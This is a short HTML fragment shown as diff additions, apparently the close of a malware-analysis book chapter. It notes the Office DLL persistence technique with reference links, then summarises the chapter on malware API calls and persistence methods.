+<div class="packt_infobox">An adversary can persist and execute the malicious code within the DLL whenever the Microsoft Office application starts. For more details, see <a href="http://www.hexacorn.com/blog/2014/04/16/beyond-good-ol-run-key-part-10/" class="calibre20">http://www.hexacorn.com/blog/2014/04/16/beyond-good-ol-run-key-part-10/</a> and <a href="https://researchcenter.paloaltonetworks.com/2016/07/unit42-technical-walkthrough-office-test-persistence-method-used-in-recent-sofacy-attacks/" class="calibre20">https://researchcenter.paloaltonetworks.com/2016/07/unit42-technical-walkthrough-office-test-persistence-method-used-in-recent-sofacy-attacks/</a>.</div>
+<div class="packt_infobox"><span class="calibre21">For further details on various persistence methods and to understand the adversary tactics and techniques, refer to MITRE’s ATT&amp;CK wiki: <a href="https://attack.mitre.org/wiki/Persistence" target="_blank" class="calibre20">https://attack.mitre.org/wiki/Persistence</a>.</span></div>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">Summary</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">Malware uses various API calls to interact with the system, and in this chapter, you learned how API calls are used by the malicious binary to implement various functionalities. This chapter also covered different persistent techniques used by the adversaries, which allow them to reside on the victim's system even after a system reboot (some of these techniques allow a malicious binary to execute code with high privileges).</p>
+<p class="calibre2">In the next chapter, you will learn about different code injection techniques used by the adversaries to execute their malicious code within the context of a legitimate process.</p>
+
+
+            </article>
+
+            
+        </section>
+    </body></html>
